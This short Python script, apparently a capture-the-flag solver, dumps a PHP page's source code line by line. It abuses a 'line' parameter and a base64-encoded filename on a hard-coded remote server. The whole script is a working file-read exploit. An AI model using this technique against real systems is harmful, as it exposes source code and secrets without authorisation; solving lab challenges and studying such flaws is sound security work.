# -*- coding: utf-8 -*-
"""
Created on Fri Nov  8 18:11:57 2019

@author: cf260
"""

import requests
s=''
for i in range(20):
    url="http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&filename=aW5kZXgucGhw"
    s += requests.get(url).text
    
print(s)
